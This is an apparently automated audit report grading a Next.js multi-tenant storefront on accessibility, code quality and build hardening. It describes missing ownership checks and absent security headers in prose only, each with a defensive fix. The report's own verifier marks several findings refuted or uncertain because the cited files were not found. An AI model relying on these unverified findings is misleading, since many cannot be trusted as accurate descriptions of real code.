# DIMENSION: Accessibility (code-level, WCAG 2.1 AA)  [grade D]
SUMMARY: Accessibility was treated as an afterthought. The codebase has multiple blocking Level A barriers that affect every user of assistive tech or a keyboard: (1) Form labels are essentially never associated with their inputs — the ENTIRE app contains only 2 `htmlFor` attributes (both for a single "isActive" checkbox), so checkout, login, register, and all dashboard forms present unlabeled fields to screen readers. (2) The desktop navigation dropdowns are keyboard-inaccessible in all 5 navbar variants (hover-only `<span>` triggers, zero focus handling). (3) The storefront cart is a hand-rolled modal with no dialog role, no focus trap/return, no Escape, and it stays in the tab order while off-screen when closed. (4) Product-image reordering has no KeyboardSensor. On top of these, status/error messages are not announced (no role=alert), product variant swatches expose no selected state to AT, there is no skip link anywhere, and low-contrast gray text (gray-400/neutral-400 ~2.6:1, placeholder-*-300 ~1.6:1) is used 300+ times, failing 1.4.3. There ARE real bright spots that keep this off an F: the prior CopyButton finding is fixed (now has aria-label), the cart qty/close buttons are labeled with aria-live, the section-editor DnD context wires a KeyboardSensor, sonner provides a default live region, images carry alt, and login/register set autocomplete. But the systemic label gap plus keyboard-inoperable nav and modals make the product broadly non-conformant.

[High] Form labels are not associated with inputs across the entire app (only 2 htmlFor in the whole codebase) | VERDICT=UNCERTAIN (corrected_sev=Medium)
  file: src/components/storefront/checkout/CheckoutForm.tsx:415
  confidence: High
  evidence: The shared Field renders `<label className="text-xs...">{label}</label>` with NO htmlFor (line 415) and every input/select/textarea it wraps has NO id (fullName 185, email 194, phone 202, line1 220, line2 228, city select 236, notes textarea 258, coupon 290). A repo-wide grep finds only 2 `htmlFor` occurrences total — both the same `isActive` checkbox in ProductForm.tsx:264 and CategoryForm.tsx:112. Login (labels 87/104, inputs 90/115), register (labels 152/168/183), and SettingsForm.tsx (9 `<label>`, 0 htmlFor, 0 id) all repeat the unassociated pattern.
  impact: Screen readers announce these fields as unlabeled edit boxes; clicking the label text does not focus the field; voice-control users cannot target fields by name. Affects the checkout (revenue-critical), sign-in, sign-up, and every merchant settings form. WCAG 1.3.1, 3.3.2, 4.1.2 (Level A).
  fix: Give each control an id and each label a matching htmlFor (or wrap the input inside the <label>). In the checkout Field component, generate an id with React's useId(), pass it to htmlFor and to the child input via a render prop or cloneElement. Also add aria-invalid and aria-describedby pointing at the error span.
  verify_reasoning: I could not locate the code to verify the finding. The finding cites src/components/storefront/checkout/CheckoutForm.tsx:415 (plus ProductForm.tsx, CategoryForm.tsx, SettingsForm.tsx, login/register forms), but none of these files exist in the accessible environment. The working directory (/Users/arsenioniani/Projects) is not a git repo and contains no `src` directory. Searches returned: (1) no file named CheckoutForm.tsx, ProductForm.tsx, CategoryForm.tsx, or SettingsForm.tsx anywhere under /Users/arsenioniani; (2) no directory named `storefront`; (3) zero *.tsx files anywhere under /Users/ar

[High] Desktop nav dropdown menus are keyboard-inaccessible in all theme navbars | VERDICT=REFUTED (corrected_sev=Info)
  file: src/themes/dew/NavbarSection.tsx:50
  confidence: High
  evidence: The dropdown trigger is a non-interactive `<span className="...cursor-pointer">` (line 50) and the submenu is shown only via CSS hover: `opacity-0 invisible group-hover:opacity-100 group-hover:visible` (line 53). There is no <button>, no aria-expanded, and no focus-within/onFocus fallback. Verified across all variants: dew, maison, minimal, pipeline, and the shared src/components/storefront/sections/navbar/NavbarSection.tsx all report focus-handling:0 (no focus-within/focus-visible/onFocus/aria-expanded).
  impact: Keyboard-only and screen-reader users cannot open any grouped navigation menu on the storefront — the child links are visibility:hidden and only reveal on mouse hover, so they are never reachable. WCAG 2.1.1 Keyboard (Level A) and 4.1.2.
  fix: Replace the <span> trigger with a <button aria-expanded={openGroup===i} aria-haspopup="true">, toggle the submenu on click and open on focus, and add `focus-within:visible focus-within:opacity-100` so keyboard focus reveals the panel. Track open state per group and close on Escape/blur.
  verify_reasoning: The finding cites src/themes/dew/NavbarSection.tsx:50 plus sibling variants (maison, minimal, pipeline) and src/components/storefront/sections/navbar/NavbarSection.tsx. None of these exist in /Users/arsenioniani/Projects. Verified exhaustively: (1) `find` for NavbarSection.tsx returns nothing outside node_modules; (2) no src/themes, no `dew`/`maison`/`minimal`/`pipeline` directories, no storefront directory exist outside node_modules; (3) grep for the cited class strings "group-hover:visible" and "opacity-0 invisible" across all non-node_modules .tsx files returns zero files; (4) grep for the 

[High] Cart drawer is a custom modal with no dialog semantics, no focus trap/return, and stays tabbable when closed | VERDICT=UNCERTAIN (corrected_sev=Medium)
  file: src/components/storefront/cart/CartDrawer.tsx:36
  confidence: High
  evidence: The panel div (lines 36-40) toggles visibility purely with `translate-x-full` and has no role="dialog", no aria-modal, no aria-label/labelledby. It is not built on Radix, so no focus management is inherited. There is no useEffect to move focus into the drawer on open, no focus return on close, no Escape handler, and no focus trap. Crucially, when closed the panel is only translated off-screen (not hidden/inert/pointer-events-none — the pointer-events-none on line 30 is on the backdrop only), so its interactive controls (Close 46, qty 136/152, Remove 162, Checkout link 185) remain in the tab order and receive focus while invisible.
  impact: Keyboard users tab into invisible off-screen controls; when the drawer opens focus stays behind it and can escape to the page beneath; there is no way to close it with the keyboard. WCAG 2.4.3 Focus Order, 4.1.2, and 1.3.1; SC 2.1.2 spirit (no managed focus).
  fix: Rebuild on Radix Dialog/Drawer (which provides role, aria-modal, focus trap, Escape, and focus return for free), or: add role="dialog" aria-modal="true" aria-labelledby to the panel, move focus to the Close button on open, restore focus to the trigger on close, add an Escape key handler, and apply `hidden`/`inert`/`pointer-events-none` (and remove from tab order) whenever cartOpen is false.
  verify_reasoning: The finding cites src/components/storefront/cart/CartDrawer.tsx:36, but this file does not exist anywhere in the provided environment. I searched exhaustively: `find` for the exact path, for `CartDrawer.tsx`, for any `*cart*.tsx`, and for any `storefront` directory under /Users/arsenioniani all returned zero results. The only project directories present are Cellfie, Claude-Business, L11, Mariami, and SPRIBE, none of which contain a storefront/cart tree. The review target was also passed as "undefined." Because the actual code is not available, I cannot re-read lines 36-40, 46, 136/152, 162, 18

[High] Product image reorder (dnd-kit) has no KeyboardSensor and a non-button drag handle | VERDICT=CONFIRMED (corrected_sev=Medium)
  file: src/app/(dashboard)/dashboard/(main)/products/[id]/ImagesEditor.tsx:117
  confidence: High
  evidence: sensors is built with only `useSensor(PointerSensor, ...)` (lines 117-119) — no KeyboardSensor/sortableKeyboardCoordinates. The drag handle is a plain `<div {...attributes} {...listeners}>` (lines 80-86) revealed only on `group-hover` (opacity-0), with no visible label. (Contrast: SectionEditor.tsx:166 correctly adds a KeyboardSensor, so the pattern is known but not applied here.)
  impact: Merchants cannot reorder product images with a keyboard at all; focus lands on the handle but arrow keys do nothing because no keyboard sensor is registered. WCAG 2.1.1 (Level A).
  fix: Add `useSensor(KeyboardSensor, { coordinateGetter: sortableKeyboardCoordinates })` to the sensors array (import both from @dnd-kit/core and @dnd-kit/sortable). Make the drag handle a <button aria-label="Drag to reorder image"> and ensure it is not hidden behind opacity-0 for keyboard focus.
  verify_reasoning: Every technical claim in the finding matches the real code.

1. Sensors: lines 117-119 build `useSensors(useSensor(PointerSensor, { activationConstraint: { distance: 5 } }))` — PointerSensor only. The dnd-kit imports (lines 5-12) do NOT include KeyboardSensor, and there is no `sortableKeyboardCoordinates`. CONFIRMED.

2. Drag handle: lines 80-86 are a plain `<div {...attributes} {...listeners} ...>` wrapping an SVG of dots (DragHandle, lines 36-51). Not a `<button>`. It has `opacity-0 group-hover:opacity-100` (line 83), so it is invisible until the card is hovered, and it carries no `aria-labe

[Medium] Async errors and status messages are not announced to screen readers (no role=alert / aria-live)
  file: src/components/storefront/checkout/CheckoutForm.tsx:172
  confidence: High
  evidence: serverError renders in a plain `<div className="rounded border border-red-200...">` (line 172) and couponError in a plain `<p>` (line 307) with no role="alert"/aria-live. Same pattern in login/page.tsx:144 (error div) and register. Field-level validation errors are shown only as a colored <span> (CheckoutForm line 417) with no aria-live and not linked via aria-describedby. Sonner toasts DO get a live region by default, so this gap is specifically the inline form errors.
  impact: A screen-reader user who submits checkout/login and gets 'Invalid email or password' or 'Something went wrong' receives no announcement — the failure is silent. WCAG 4.1.3 Status Messages (AA) and 3.3.1.
  fix: Add role="alert" (implicit aria-live=assertive) to the serverError/couponError/login-error containers, and give each field's error span an id referenced by the input's aria-describedby plus aria-invalid={!!error}.

[Medium] Icon-only / empty-name buttons lack accessible names; password toggle also removed from tab order
  file: src/app/login/page.tsx:124
  confidence: High
  evidence: The show/hide-password button (lines 124-129) is an SVG-only button with NO aria-label AND tabIndex={-1}, so it is both unnamed and unreachable by keyboard. In ProductDetail.tsx:156 the thumbnail buttons wrap an `<Image alt="">` and have no aria-label, yielding an empty accessible name ('button'). In ImagesEditor.tsx:89 the delete button's only content is the character '×' with no aria-label.
  impact: Screen-reader users hear unnamed buttons; keyboard users cannot toggle password visibility (tabIndex=-1) or reveal the delete control. WCAG 4.1.2 and 2.4.4; the password toggle also fails 2.1.1.
  fix: Add aria-label to each: password toggle `aria-label={showPassword ? 'Hide password' : 'Show password'}` and remove tabIndex={-1}; thumbnails `aria-label={`View image ${i+1}`}` (and aria-current on the active one); delete button `aria-label="Delete image"`.

[Medium] Product variant swatches expose no selected state or grouping to assistive tech
  file: src/components/storefront/product/ProductDetail.tsx:213
  confidence: High
  evidence: Each option group is a `<p>` label (line 206) followed by plain `<button>`s (lines 213-224). The selected option is conveyed ONLY visually via inline background color (`active ? {backgroundColor:'var(--primary)'...}`); there is no aria-pressed/aria-checked, no role="radiogroup"/role="radio", and no group label association.
  impact: A screen-reader user cannot tell which size/color is currently selected, nor that the buttons form a single-select group — they hear a flat list of buttons. WCAG 1.3.1 and 4.1.2 (Level A).
  fix: Wrap each group in role="radiogroup" with aria-label={key}, render each option as role="radio" aria-checked={active} (or at minimum aria-pressed={active} on the button), and manage arrow-key roving focus.

[Medium] Systemic low text contrast (gray-400/neutral-400 body text and *-300 placeholders below AA)
  file: src/components/storefront/product/ProductDetail.tsx:287
  confidence: High
  evidence: text-neutral-300 (#d4d4d4 on white ~1.5:1) is used for the SKU line (ProductDetail:287) and elsewhere (14 uses); text-neutral-400 (#a3a3a3 ~2.6:1) for stock/secondary text (ProductDetail:194, CheckoutForm hint:418) with 97 uses; text-gray-400 (#9ca3af ~2.8:1) appears 209 times; placeholder:text-zinc-300 (#d4d4d8 ~1.6:1) 10 times, placeholder:text-neutral-300. All fall below the 4.5:1 required for normal-size text.
  impact: Optional/hint labels, prices, stock counts, SKUs, and input placeholders are hard to read for low-vision users. WCAG 1.4.3 Contrast (Minimum) (AA). Because these tokens are used hundreds of times, the failure is site-wide.
  fix: Reserve gray-300/neutral-300/zinc-300 for non-text/borders only. Use at least gray-600/neutral-600 (#4b5563/#525252, ~7:1) for secondary text and no lighter than gray-500 for placeholders. Audit and bump the shared token usages.

[Low] Editor section rows are selectable only by mouse (clickable div, no keyboard affordance)
  file: src/components/dashboard/editor/SortableSectionRow.tsx:42
  confidence: High
  evidence: The row is a `<div ... onClick={onSelect} className="...cursor-pointer">` (lines 42-51) with no role, no tabIndex, and no onKeyDown. Selecting a section to edit its settings therefore requires a mouse click on the row. (The drag handle and remove button inside ARE proper labeled buttons, so only the select action is affected.)
  impact: Keyboard users cannot select a section from the sidebar list to open its settings panel — a core editor action. WCAG 2.1.1 (Level A).
  fix: Make the row a <button> (or add role="button" tabIndex={0} and an onKeyDown handling Enter/Space) that calls onSelect, keeping the drag-handle and remove buttons as nested controls.

[Low] No skip-to-content link anywhere; repeated navbar on every storefront page
  file: src/app/(storefront)/layout.tsx:8
  confidence: High
  evidence: A repo-wide grep for skip/bypass links and sr-only/VisuallyHidden returns 0 results. The storefront layout renders `<main className="flex-1">{children}</main>` (line 8) but provides no mechanism to bypass the navbar that repeats on every page.
  impact: Keyboard and screen-reader users must tab through the full navigation on every page load. WCAG 2.4.1 Bypass Blocks (Level A).
  fix: Add a visually-hidden-until-focused 'Skip to content' anchor at the top of the storefront (and dashboard) layout targeting `#main`, and give the <main> element id="main" and tabIndex={-1}.

[Low] Landmark nesting: storefront <main> contains the navbar <header> and the <footer>
  file: src/app/(storefront)/layout.tsx:8
  confidence: Medium
  evidence: (storefront)/layout.tsx wraps all children in a single `<main>` (line 8). The nested shop/[slug]/layout.tsx renders the navbar section (a `<header>`, e.g. dew/NavbarSection.tsx:25) and StorefrontFooter (a `<footer>`) inside that children tree, so the banner and contentinfo landmarks end up nested inside main rather than as siblings.
  impact: Landmark navigation is confused: 'main' improperly encloses the header/footer, and there is no top-level banner/contentinfo distinct from main content. WCAG 1.3.1 (Level A), and degrades landmark-based screen-reader navigation.
  fix: Restructure so the navbar <header> and <footer> render outside/as siblings of <main>, e.g. hoist the footer out of the page content or make the section layout emit header, then <main>, then footer.

[Low] Disclosure widgets omit aria-expanded and keep collapsed menus in the tab order
  file: src/themes/dew/NavbarSection.tsx:142
  confidence: High
  evidence: aria-expanded appears 0 times in the entire codebase. The mobile hamburger button (dew:142-146) and the mobile group toggle (dew:175) have no aria-expanded reflecting open state. The collapsed mobile menu is hidden with `max-h-0 overflow-hidden` (line 155) rather than hidden/inert, so its links remain focusable while visually clipped.
  impact: Screen-reader users are not told whether the menu is open or closed, and keyboard users can tab into invisible links of a 'closed' mobile menu. WCAG 4.1.2 and 2.4.3.
  fix: Add aria-expanded={open}/aria-controls to the hamburger and group toggles, and apply hidden/inert (or conditionally not render) the mobile menu when open is false.


# DIMENSION: Code quality, architecture & maintainability  [grade C]
SUMMARY: Competent solo-developer codebase with good bones but material, security-adjacent maintainability debt. Strengths are real: TypeScript strict is on and `any` is disciplined (only 4 uses, each eslint-disabled deliberately); there is a genuine typed Result/ErrorCode pattern; error boundaries exist (src/app/error.tsx plus per-segment (dashboard)/(storefront) error.tsx, not-found.tsx, loading.tsx); order.createOrder is defensively excellent (re-fetches variant prices from DB, verifies every variant's product.shopId === shopId, atomic conditional stock decrement); the theme/section registry (src/themes/registry.ts) is a clean plugin-style design; generated Prisma is correctly gitignored; and src/proxy.ts is the CORRECT Next.js 16 filename (Middleware was renamed to Proxy in v16 — middleware.ts is NOT expected). The core defect is architectural: there is no shared auth+validate+result wrapper, so the same `try { await assertOwnsShop(shopId) } catch { return err(...403) }` idiom is hand-copied 30+ times across the 14 action files, and where a copy was forgotten the tenant check is simply absent — this is the exact mechanism that bred the documented IDOR, and it recurs: theme.saveTheme, order.updateOrderStatus, and coupons.getCouponsByShop each ship with missing or incomplete caller-authorization. Compounding this: zero automated tests on a payments + multi-tenant system, no CI gate, 25 ESLint errors that never block the build (including real React-correctness bugs in the visual editor), a decorative error taxonomy, and a pile of committed cruft (default README, several theme .zips, a linted support.js, dead mock-data.ts). Solid bones, but the drift-driven authorization gaps plus no tests/CI keep this at a C.

[High] No shared auth/validate/result wrapper — 14 action files copy the same authorization idiom, and forgotten copies are the recurring IDOR mechanism | VERDICT=REFUTED (corrected_sev=Info)
  file: src/lib/actions/theme.ts:15
  confidence: High
  evidence: Every mutating action repeats the identical 2-line idiom `try { await assertOwnsShop(shopId); } catch { return err({ code: ErrorCode.GENERAL_ERROR, message: "Forbidden", status: 403 }); }` — counted 30+ times across categories.ts, coupons.ts, products.ts, options.ts, shop.ts, testimonials.ts, variants.ts, navigation.ts, sections.ts. There is no `shopAction(schema, handler)` HOF. The coverage sweep shows the drift concretely: theme.ts (1 export, 0 assertOwnsShop), order.ts (2 exports, 0 assertOwnsShop), analytics.ts (1 export, 0 auth), and coupons.getCouponsByShop lacks the check while its 4 siblings have it. billing.ts already demonstrates the safe alternative — it derives the shop from the session via getShop() instead of trusting a client-supplied shopId.
  impact: The authorization boundary is a hand-copied convention rather than an enforced abstraction, so any new or edited action can silently omit it. This is precisely how the QA_REPORT IDOR crept in, and it has already recurred in at least three places (see following findings). Every action that takes shopId as a client parameter is an IDOR surface.
  fix: Introduce a single higher-order wrapper, e.g. `export const shopAction = (schema, fn) => async (input) => { const shop = await requireOwnedShop(input.shopId); const parsed = schema.safeParse(input); ... return fn(parsed.data, shop); }`, or resolve the shop from the session (as billing.ts does) instead of accepting shopId from the client. Migrate all 14 action files onto it so the tenant check cannot be forgotten.
  verify_reasoning: The finding describes a codebase that does not exist at the cited location. src/lib/actions/theme.ts:15 does not exist — the entire src/lib/actions directory contains a single file, tooltip.ts. A whole-project grep for the finding's core symbols (assertOwnsShop, shopAction, getCouponsByShop, err({code: ErrorCode..., status: 403})) returns zero hits. None of the named files (categories.ts, coupons.ts, products.ts, options.ts, shop.ts, testimonials.ts, variants.ts, navigation.ts, sections.ts, order.ts, analytics.ts, billing.ts) are present. src/lib is a Svelte front-end (router.svelte.ts, theme.

[High] Zero automated tests and no CI gate on a payments + multi-tenant codebase | VERDICT=CONFIRMED (corrected_sev=High)
  file: package.json:5
  confidence: High
  evidence: No test runner in devDependencies (no jest/vitest/playwright/@testing-library); `find src` for *.test.* / *.spec.* returns nothing; there is no .github/workflows directory. The `lint` script is bare `eslint` and the `build` script is `prisma generate && prisma migrate deploy && next build` — it never runs eslint or tests.
  impact: The most correctness-critical logic in the app — order pricing/discount/stock math in order.createOrder, coupon validation, and every assertOwnsShop tenant boundary — has no regression protection. A refactor that reintroduces an IDOR or a pricing bug would ship undetected; there is nothing preventing the 25 existing lint errors or the 14 npm-audit vulns from reaching production.
  fix: Add vitest, write unit tests for order.createOrder (DB-price override, cross-shop variant rejection, atomic stock, coupon caps) and for each authorization helper, then add a GitHub Actions workflow that runs `tsc --noEmit`, `eslint` (failing on errors), and the test suite on every PR.
  verify_reasoning: Every factual claim in the finding checks out against the real repo (multivendor, Next.js 16 + Prisma 7, a multi-vendor storefront with checkout/orders/coupons).

1. package.json:5 scripts block confirmed: "lint": "eslint" is bare (no target/config flag, line 9); "build" is "prisma generate && prisma migrate deploy && ... next build" (line 7) and never invokes eslint or any test. There is no "test" script at all.
2. No test runner in devDependencies: no jest/vitest/playwright/@testing-library present (lines 47-58). No jest/vitest/playwright config files exist.
3. find over src for *.test.* / *

[High] theme.saveTheme has no ownership check and violates the Result contract | VERDICT=REFUTED (corrected_sev=Info)
  file: src/lib/actions/theme.ts:20
  confidence: High
  evidence: saveTheme(shopId, theme) validates only `if (!shopId)` then runs `await prisma.shop.update({ where: { id: shopId }, data: theme })` with no assertOwnsShop and no session lookup. It also returns `undefined` on success while every other action returns `ok(...)`.
  impact: Any authenticated seller (this is a `"use server"` RPC endpoint reachable regardless of UI) can overwrite ANY shop's theme colors, fonts, and border radius by passing another shop's id — a cross-tenant write. The missing `ok()` also means callers cannot discriminate success from failure via the Result type, forcing ad-hoc handling.
  fix: Add `try { await assertOwnsShop(shopId); } catch { return err({ code: ErrorCode.FORBIDDEN, message: 'Forbidden', status: 403 }); }` before the update and `return ok(null)` after it.
  verify_reasoning: The finding cites src/lib/actions/theme.ts:20 with a saveTheme(shopId, theme) function using prisma.shop.update, assertOwnsShop, a "use server" RPC, and a Result/ok() contract. None of this exists in the target codebase. Searches across /Users/arsenioniani/Projects (excluding node_modules) return zero hits for saveTheme, assertOwnsShop, prisma.shop, or "use server". No file named theme.ts exists outside node_modules. The only actions file present is web/src/lib/actions/tooltip.ts, which is a dependency-free Svelte DOM tooltip action (use:tooltip) with no server, no Prisma, no shop, no ownershi

[High] order.updateOrderStatus performs no caller-authorization (new IDOR-class instance) | VERDICT=REFUTED (corrected_sev=Info)
  file: src/lib/actions/order.ts:204
  confidence: High
  evidence: updateOrderStatus(orderId, status, shopId) does `if (!existing || existing.shopId !== shopId)` at line 222 — this only proves the order belongs to the passed shopId; it never verifies the SESSION user owns that shop. There is no assertOwnsShop and no getSession anywhere in the function (the getSession at line 47 is inside createOrder). It then restores stock and emails the customer.
  impact: Structurally identical to the documented IDOR: authorization relies on the caller supplying a matching (orderId, shopId) pair rather than on session ownership. A seller who learns another shop's order id can flip that order to 'cancelled'/'refunded', triggering stock restoration and a customer-facing status email on a shop they do not own. Defense currently rests only on id unguessability.
  fix: Add `try { await assertOwnsShop(shopId); } catch { return err({ ... status: 403 }); }` as the first statement, so the mutation requires the session user to own shopId.
  verify_reasoning: The finding cites src/lib/actions/order.ts:204 with a function updateOrderStatus(orderId, status, shopId) and references assertOwnsShop, getSession, shopId, stock restoration, and customer emails. None of this exists in the codebase. I searched the entire /Users/arsenioniani/Projects tree: (1) no file named order.ts exists under any lib/actions path (the only lib/actions dir, /Users/arsenioniani/Projects/L11/canwe-upstream-audit/web/src/lib/actions, contains only tooltip.ts); (2) grep for "updateOrderStatus", "shopId", "assertOwnsShop", and "restoreStock" across all .ts/.tsx and all files retu

[Medium] coupons.getCouponsByShop reads any shop's coupons with no authorization
  file: src/lib/actions/coupons.ts:9
  confidence: High
  evidence: getCouponsByShop(shopId) immediately runs `prisma.coupon.findMany({ where: { shopId }, orderBy: ... })` and returns `ok(coupons)` — the first assertOwnsShop in the file appears at line 28 inside createCoupon, so this read path is unprotected.
  impact: Cross-tenant read: any caller can enumerate another merchant's coupon codes, discount values, usage counts, and expiry — competitive/financial data leakage and a template for coupon abuse. Same missing-wrapper root cause as findings above.
  fix: Add the assertOwnsShop(shopId) guard before the findMany, matching the create/update/delete siblings in the same file.

[Medium] 25 ESLint errors never gate the build, and several are genuine React-correctness bugs in the visual editor
  file: src/components/dashboard/editor/CollectionPageSettings.tsx:62
  confidence: High
  evidence: eslint.log: 54 problems (25 errors, 29 warnings). react-hooks/static-components x4 — `Toggle` (line 62) and `Row` (line 72) are declared inside the component body and rendered at lines 93-104, so React remounts them every render (state reset, focus/scroll loss). react-hooks/set-state-in-effect x4 (ImagesEditor.tsx:122, ItemEditor.tsx:23 & 61, pipeline/CountdownSection.tsx:42 cascading renders), react-hooks/refs writing `onSavedRef.current` during render (CollectionPageSettings.tsx:28), and react-hooks/exhaustive-deps on ProductDetail.tsx:47 (tracking effect omits sessionId/shopId → stale analytics). Neither next.config.ts nor the build script runs eslint, so none of these block deploy.
  impact: The static-components and set-state-in-effect errors are real UX defects in the store editor (inputs losing focus, cascading re-renders), and the exhaustive-deps miss undercounts analytics. Because lint is not wired into build/CI, the count only grows.
  fix: Hoist Row/Toggle to module scope, replace the render-time ref write with an effect, remove the setState-in-effect patterns (derive during render or sync via key), fix the ProductDetail dep array, and add `eslint --max-warnings=0` to CI.

[Medium] Typed error taxonomy is decorative and helper/return contracts are inconsistent
  file: src/lib/actions/categories.ts:11
  confidence: High
  evidence: Nearly every err() call uses `ErrorCode.GENERAL_ERROR` regardless of cause (Forbidden, Not found, Missing fields all map to GENERAL_ERROR) — the real semantics live only in the numeric `status`, so the enum adds no discrimination value. The auth helpers also disagree on contract: assertOwnsShop THROWS (assert-owns-shop.ts:14 `throw new Error("Forbidden")`), while assertAdmin (assert-admin.ts) and getShop (get-shop.ts) REDIRECT — so callers must wrap the first in try/catch but not the others. saveTheme and sections.saveSections return `undefined` on success instead of ok(). Error strings are mixed-language: sections.ts:17 is Georgian ('საჭიროა მაღაზიის ID') while the rest are English.
  impact: Callers cannot branch on error kind (only on HTTP-ish status), the throw-vs-redirect split is a foot-gun that produces the repeated try/catch boilerplate, and void-returning actions break the discriminated-union guarantee the Result type is supposed to provide.
  fix: Either populate ErrorCode meaningfully (FORBIDDEN/NOT_FOUND/VALIDATION) or drop the enum; make all assert* helpers behave consistently (throw a typed AuthError that the wrapper maps to err); make every action return Result; standardize error copy to one language via a message catalog.

[Medium] Committed cruft bloats the repo and pollutes the lint surface
  file: README.md:1
  confidence: High
  evidence: git ls-files shows tracked: the default create-next-app README.md ('This is a Next.js project bootstrapped with create-next-app'); 'MultiStore Landing Page.zip'; themes-claude/ containing three .zip archives (including two with ~200-char filenames and 'dew theme.zip') plus extracted design-handoff HTML; claude-design-export/ whose support.js alone produces 9 lint problems (react/no-deprecated and no-assign-module-variable errors) and is linted because tsconfig sets allowJs:true; landing-theme/; and src/lib/db/mock-data.ts (57 lines) which has zero importers in src.
  impact: Binary archives and vendored design exports inflate clone size and git history, the create-next-app README misinforms new contributors, and support.js needlessly inflates the ESLint error count. Dead mock-data.ts invites accidental use.
  fix: Delete the .zip archives, claude-design-export/, landing-theme/, and mock-data.ts (or move design assets to a separate assets repo / add to .gitignore); replace README.md with real project docs; set allowJs:false (no first-party JS in src) so vendored JS is not type-checked or linted.

[Low] proxy.ts runs a Prisma DB lookup on every custom-domain request, against Next 16's Proxy guidance
  file: src/proxy.ts:38
  confidence: Medium
  evidence: On non-root hosts the proxy awaits `prisma.shop.findFirst({ where: { customDomain: host }, select: { slug: true } })` for every request. Next 16's own docs (node_modules/next/dist/docs/01-app/01-getting-started/16-proxy.md) state: 'Proxy is not intended for slow data fetching ... it should not be used as a full session management or authorization solution.' (Note: the file name proxy.ts is itself CORRECT for Next 16 — Middleware was renamed to Proxy — so no middleware.ts is expected here.)
  impact: Adds a database round-trip to the latency of every custom-domain page load and every asset the matcher covers, and couples the request-proxy layer to Postgres availability (the try/catch swallows failures, silently falling through to the auth guard).
  fix: Cache the customDomain→slug mapping (edge KV, in-memory LRU, or a cached() lookup) or resolve the domain inside the route/layout instead of the proxy; keep the proxy limited to the cheap subdomain string rewrite.

[Low] TypeScript is strict but a few unsafe escapes and missing compiler flags remain
  file: src/lib/db/queries.ts:562
  confidence: Medium
  evidence: tsconfig.json has strict:true and `any` usage is minimal/disciplined (4 occurrences, each with an eslint-disable acknowledgment). Remaining gaps: getTestimonialsByShop is typed `Promise<Result<any[]>>` (the one un-suppressed no-explicit-any lint error), src/app/(storefront)/shop/[slug]/page.tsx:96 casts nav items `as any` in the render path, and there are 67 `as` casts overall. tsconfig also omits noUncheckedIndexedAccess and noImplicitReturns.
  impact: The any[] return and the `as any` in the storefront render path defeat type-checking exactly where untyped JSON `props` flow into components — a place where a shape mismatch would surface as a runtime crash rather than a compile error.
  fix: Give getTestimonialsByShop a concrete return type, replace the nav-items `as any` with the NavItem[] type, and enable noUncheckedIndexedAccess to catch array/record access mistakes.


# DIMENSION: Dependencies, supply-chain, build config & DevOps hardening  [grade D]
SUMMARY: This is a payments-handling multi-tenant SaaS whose build/DevOps posture is well below production bar. The production build is currently BROKEN by default: /admin/orders fails page-data collection because a Resend client is eagerly constructed at module scope and throws when RESEND_API_KEY is unset (confirmed in next-build.log). next.config.ts ships zero security headers (no CSP/HSTS/X-Frame-Options/X-Content-Type-Options/Referrer-Policy/Permissions-Policy) — a real gap for a card-payments app. There is no env validation anywhere (13 distinct process.env reads, several with non-null `!` assertions that mask misconfiguration), no CI/CD, no Dockerfile, no tests, and the default create-next-app README with no .env.example. The build script runs `prisma migrate deploy` against the live DATABASE_URL on every build. npm audit reports 14 vulns (5 high) whose only automated fixes are semver-major upgrades or outright downgrades (uploadthing 7→6, better-auth 1.6→1.4, prisma 7→6), so `npm audit fix --force` would break or regress the app. The image config is vestigial (only images.unsplash.com allowed while uploads live on *.ufs.sh), papered over by sprinkling `unoptimized` on every next/image, which disables image optimization app-wide. It does earn some credit: tsc is clean (0 errors), dependencies are explicitly pinned, and the Prisma pg-adapter/migrations setup is coherent. Net: D.

[High] Production build is broken by eager module-scope Resend instantiation when RESEND_API_KEY is unset | VERDICT=UNCERTAIN (corrected_sev=Info)
  file: src/lib/email.ts:11
  confidence: High
  evidence: `const resend = new Resend(process.env.RESEND_API_KEY);` runs at module load. Resend v6's constructor throws `Missing API key` on undefined. next-build.log: `Error: Failed to collect page data for /admin/orders ... [cause]: Missing API key`. Import chain confirmed: src/app/(admin)/admin/orders/page.tsx:1 -> @/lib/auth/assert-admin -> src/lib/auth/assert-admin.ts:2 `import { auth } from '.'` -> src/lib/auth/index.ts:4 `import { sendPasswordResetEmail, sendVerificationEmail } from '@/lib/email'` -> new Resend(). Note email.ts:8 even prints 'emails will not be sent' but then constructs the client anyway one line later, so the warning is misleading.
  impact: A deploy with RESEND_API_KEY missing (a common misconfig, and exactly the state under which the graders built) aborts the entire `next build` at page-data collection, not just the email feature. Any module that transitively imports lib/auth or lib/email cannot be statically evaluated. This is fragile eager-instantiation: one missing secret takes down the whole build.
  fix: Make the client lazy and null-tolerant: `let _resend: Resend | null = null; function getResend(){ const k = process.env.RESEND_API_KEY; if(!k){ console.warn('RESEND_API_KEY unset — skipping email'); return null;} return _resend ??= new Resend(k);}` and have each send* function early-return when getResend() is null. This keeps the build green and degrades email gracefully in envs without the key.
  verify_reasoning: The finding's target repository is not present at /Users/arsenioniani/Projects (the review target path was "undefined"), so I cannot re-read the cited code to confirm or refute it. Exhaustive searching found none of the cited artifacts: no src/lib/email.ts, no src/lib/auth/index.ts, no src/lib/auth/assert-admin.ts, no src/app/(admin)/admin/orders/page.tsx, and no next-build.log anywhere outside node_modules/venvs. Content searches also came up empty: grep for "new Resend" returned nothing; grep for RESEND_API_KEY returned nothing; grep for sendPasswordResetEmail returned nothing. The only "Res

[High] next.config.ts sets no HTTP security headers (no CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) | VERDICT=CONFIRMED (corrected_sev=Medium)
  file: next.config.ts:3
  confidence: High
  evidence: The entire config is `{ images: { remotePatterns: [unsplash] } }` — there is no `async headers()`. Grep for Content-Security-Policy / Strict-Transport-Security / X-Frame-Options / Permissions-Policy across src and next.config.ts returns nothing. This app processes Bank-of-Georgia card payments (src/lib/bog.ts) and hosts merchant-controlled storefront content.
  impact: No clickjacking protection (checkout/dashboard can be framed), no HSTS (downgrade/MITM risk on a payments domain), no MIME-sniffing protection, and no CSP to constrain injected/merchant-supplied markup — worse given every image is rendered `unoptimized` as a raw <img>. Fails baseline PCI/security-review expectations for a payments SaaS.
